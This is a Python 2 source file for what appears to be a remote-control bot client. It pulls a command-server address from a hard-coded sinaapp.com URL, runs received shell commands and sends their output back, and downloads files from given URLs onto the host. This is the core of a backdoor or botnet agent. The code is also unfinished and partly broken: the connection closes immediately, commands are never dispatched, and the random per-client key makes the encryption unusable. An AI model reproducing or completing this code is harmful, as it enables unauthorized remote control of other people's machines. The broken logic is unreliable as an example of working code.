#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import subprocess
import threading
import time
import urllib
import json
import socket
import struct
from Crypto.Cipher import AES

__author__ = 'nekocode'


class Client(threading.Thread):

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return ciphertext

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(ciphertext)
        return plain

    def __init__(self):
        threading.Thread.__init__(self)

        self.addr = get_server_addr()
        self.sc = None

        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.CMD_PACK_SIZE = struct.calcsize('!IL')

        self.daemon = True
        self.start()

    def run(self):
        while True:
            try:
                self.sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sc.connect(self.addr)

                self.sc.close()

            except Exception as e:
                print e.message
                if self.sc:
                    self.sc.close()
                time.sleep(3)

    def read(self):
        cmd_flag, data_size = struct.unpack('!IL', self.sc.recv(self.CMD_PACK_SIZE))

        if cmd_flag == 0:
            # exec command
            raw = self.sc.recv(data_size)
            cmd_info = json.loads(self.decrypt(raw))

        elif cmd_flag == 1:
            # download
            raw = self.sc.recv(data_size)
            download_info = json.loads(self.decrypt(raw))

        else:
            return

    def send_rlt(self, jobid, rlt):
        data_to_send = json.dumps({"jobid": jobid, "rlt": rlt})

        data_size = len(data_to_send)
        rlt_info = struct.pack('!IL', 101, data_size)
        self.sc.sendall(rlt_info)
        self.sc.sendall(data_to_send)


class ExecCmd(threading.Thread):
    def __init__(self, command, jobid, client):
        threading.Thread.__init__(self)
        self.command = command
        self.jobid = jobid
        self.client = client

        self.daemon = True
        self.start()

    def run(self):
        try:
            proc = subprocess.Popen(self.command, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_str = proc.stdout.read()
            stdout_str += proc.stderr.read()
            data_to_send = json.dumps({"jobid": self.jobid, "rlt": stdout_str})

            self.client.send_rlt(self.jobid, data_to_send)

        except Exception as e:
            if e.message is None or e.message == '':
                data_to_send = 'unkown err'
            else:
                data_to_send = e.message

            self.client.send_rlt(self.jobid, data_to_send)


class Download(threading.Thread):
    def __init__(self, url, filename, jobid, client):
        threading.Thread.__init__(self)
        self.url = url
        self.filename = filename
        self.jobid = jobid
        self.client = client

        self.daemon = True
        self.start()

    def run(self):
        try:
            data = urllib.urlopen(self.url).read()
            with open(self.filename, 'wb') as f:
                f.write(data)

            self.client.send_rlt(self.jobid, 'download finished: ' + self.filename)

        except Exception as e:
            if e.message is None or e.message == '':
                data_to_send = 'unkown err'
            else:
                data_to_send = e.message

            self.client.send_rlt(self.jobid, data_to_send)


def get_server_addr():
    while True:
        try:
            json_str = urllib.urlopen('http://1.nekocode.sinaapp.com/nbd_server_host').read()
            addr_ = json.loads(json_str)
            return addr_['host'], int(addr_['port'])
        except Exception as e:
            if e.message is not None:
                print e.message

            time.sleep(5)


if __name__ == '__main__':
    Client()
    while True:
        time.sleep(10)

